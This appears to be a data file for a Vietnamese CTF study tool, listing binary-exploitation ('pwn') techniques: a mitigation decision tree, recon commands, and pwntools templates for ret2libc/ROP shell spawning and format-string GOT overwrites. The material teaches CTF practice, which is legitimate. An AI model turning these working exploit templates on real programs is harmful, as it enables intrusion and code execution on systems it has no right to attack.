DATA.find(s => s.id === "pwn").items.push(
  {
    id: "pwn-decision",
    title: "Pwn decision tree",
    summary: "Checksec trước, rồi chọn hướng theo mitigation. Đừng viết exploit trước khi biết libc và offset.",
    tags: ["triage", "checksec", "methodology"],
    priority: "high",
    tree: [
      {
        sign: "Có binary / remote service",
        actions: [
          "file, checksec, ldd, strings, readelf",
          "Chạy thử local; xác định input/output",
          "seccomp-tools dump",
          "Xác định libc version; pwninit/patchelf"
        ]
      },
      {
        sign: "NX disabled",
        actions: [
          "Shellcode trên stack",
          "Kiểm tra bad chars và vị trí buffer"
        ]
      },
      {
        sign: "Canary enabled",
        actions: [
          "Leak canary bằng format string/overread",
          "Brute force nếu process fork",
          "Giữ nguyên canary khi overwrite return address"
        ]
      },
      {
        sign: "PIE enabled",
        actions: [
          "Leak code pointer (fmt, puts, stack)",
          "Partial overwrite 1-2 byte",
          "Brute force 4 bit nếu cần"
        ]
      },
      {
        sign: "NX on, không có win()",
        actions: [
          "ret2libc: leak GOT puts/printf, return main",
          "ROP/ret2syscall/ret2csu",
          "Kiểm tra stack alignment"
        ]
      },
      {
        sign: "Có printf(buf)",
        actions: [
          "Tìm offset %p",
          "Leak canary/libc/PIE/stack",
          "Ghi GOT bằng %n/%hn",
          "fmtstr_payload nếu đủ quyền"
        ]
      },
      {
        sign: "Có malloc/free, note app",
        actions: [
          "Xác định glibc version",
          "UAF/double free",
          "Leak heap/libc bằng unsorted bin",
          "tcache poisoning; safe-linking",
          "FSOP/hooks tùy glibc"
        ]
      },
      {
        sign: "Seccomp filter",
        actions: [
          "seccomp-tools dump",
          "ORW shellcode: open/read/write",
          "openat/execveat nếu execve bị chặn"
        ]
      }
    ],
    links: [
      { title: "pwn.college", url: "https://pwn.college/" },
      { title: "how2heap", url: "https://github.com/shellphish/how2heap" }
    ]
  },
  {
    id: "pwn-recon",
    title: "Setup & recon",
    summary: "Chuẩn bị môi trường đúng libc trước khi exploit. Sai libc/ld là mất 30 phút vô ích.",
    tags: ["checksec", "libc", "pwntools"],
    priority: "high",
    signals: [
      "Binary ELF/PE, có hoặc không source",
      "Có remote host:port",
      "Có file libc.so.6 hoặc ld",
      "Có seccomp"
    ],
    checklist: [
      "file, checksec, ldd, strings, readelf -h/-s.",
      "objdump -d hoặc Ghidra/IDA xem main và hàm nguy hiểm.",
      "seccomp-tools dump nếu có filter.",
      "Chạy thử local; xác định input format.",
      "Xác định libc version; dùng pwninit/patchelf nếu cần.",
      "Viết template pwntools có local/remote ngay từ đầu."
    ],
    commands: [
      {
        title: "Recon nhanh",
        code: C(
          "file chall",
          "checksec --file=chall",
          "ldd chall",
          "strings -a chall | head -50",
          "readelf -h chall",
          "seccomp-tools dump ./chall"
        )
      },
      {
        title: "Setup libc",
        code: C(
          "pwninit",
          "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall"
        )
      }
    ],
    gotchas: [
      "Full RELRO: không ghi GOT được; dùng ret2dlresolve/FSOP.",
      "Đúng libc nhưng sai ld cũng crash.",
      "ASLR bật mặc định; leak trước khi tính địa chỉ.",
      "Docker/remote có thể dùng libc khác binary local."
    ],
    links: [
      { title: "pwntools docs", url: "https://docs.pwntools.com/" },
      { title: "pwn.college", url: "https://pwn.college/" }
    ]
  },
  {
    id: "pwn-ret2libc",
    title: "ret2libc / ROP",
    summary: "NX on, không có win(): leak libc từ GOT, quay lại main, rồi gọi system('/bin/sh').",
    tags: ["ret2libc", "rop", "pwntools"],
    priority: "high",
    signals: [
      "NX enabled",
      "Không có hàm win()",
      "Có libc.so.6 hoặc leak được libc",
      "Có buffer overflow"
    ],
    checklist: [
      "Tìm offset bằng cyclic/cyclic_find.",
      "Leak puts/printf GOT bằng ROP.",
      "Return về main để exploit lần 2.",
      "Tính libc base từ leak.",
      "Tìm pop rdi; ret và ret alignment.",
      "Gọi system('/bin/sh') hoặc one_gadget."
    ],
    payloads: [
      {
        title: "pwntools template",
        code: C(
          "from pwn import *",
          "",
          "elf = ELF('./chall')",
          "libc = ELF('./libc.so.6')",
          "context.binary = elf",
          "p = process(elf.path)  # remote('HOST', PORT)",
          "",
          "offset = 40  # cyclic -l ...",
          "pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]",
          "ret = ROP(elf).find_gadget(['ret'])[0]",
          "",
          "payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])",
          "p.sendlineafter(b'> ', payload)",
          "leak = u64(p.recvline().strip().ljust(8, b'\\\\x00'))",
          "libc_base = leak - libc.sym['puts']",
          "system = libc_base + libc.sym['system']",
          "binsh = libc_base + next(libc.search(b'/bin/sh'))",
          "",
          "payload2 = flat(b'A'*offset, ret, pop_rdi, binsh, system)",
          "p.sendlineafter(b'> ', payload2)",
          "p.interactive()"
        )
      }
    ],
    commands: [
      {
        title: "Gadget / offset",
        code: C(
          "cyclic 200",
          "ROPgadget --binary chall | grep 'pop rdi'",
          "one_gadget libc.so.6"
        )
      }
    ],
    gotchas: [
      "64-bit dùng pop rdi; ret, không phải pop rdi; pop rbp.",
      "Stack alignment: thêm một ret trước system nếu crash.",
      "puts dừng ở newline; dùng recvline và pad đúng 8 byte.",
      "libc base phải trừ đúng symbol đã leak."
    ],
    links: [
      { title: "Nightmare", url: "https://guyinatuxedo.github.io/" },
      { title: "ROP Emporium", url: "https://ropemporium.com/" }
    ]
  },
  {
    id: "pwn-fmt",
    title: "Format string",
    summary: "printf(buf) là mỏ vàng: leak canary/libc/PIE/stack, rồi ghi GOT hoặc return address.",
    tags: ["format-string", "gt", "pwntools"],
    priority: "high",
    signals: [
      "printf(buf) hoặc sprintf(out, buf)",
      "Input chứa %p/%s/%n",
      "Có thể leak stack",
      "GOT writable (không Full RELRO)"
    ],
    checklist: [
      "Tìm offset bằng chuỗi %p.",
      "Leak canary/libc/PIE/stack.",
      "Đọc arbitrary memory bằng %s.",
      "Ghi GOT bằng %n/%hn.",
      "Nếu Full RELRO: leak rồi ret2dlresolve/ROP."
    ],
    payloads: [
      {
        title: "Leak offset",
        code: "p.sendline(b'%p.' * 20)"
      },
      {
        title: "Ghi GOT",
        code: C(
          "from pwn import *",
          "elf = ELF('./chall')",
          "p = process(elf.path)",
          "offset = 6  # %p offset",
          "payload = fmtstr_payload(offset, {elf.got['printf']: elf.plt['system']})",
          "p.sendline(payload)"
        )
      }
    ],
    gotchas: [
      "64-bit argument order: 6 thanh ghi trước, rồi stack.",
      "%n đếm số ký tự đã in; dùng %hn để ghi 2 byte.",
      "Buffering có thể làm leak chậm; flush bằng newline.",
      "Full RELRO không ghi GOT được."
    ],
    links: [
      { title: "Nightmare — format string", url: "https://guyinatuxedo.github.io/" },
      { title: "pwntools fmtstr", url: "https://docs.pwntools.com/en/stable/fmtstr.html" }
    ]
  }
);
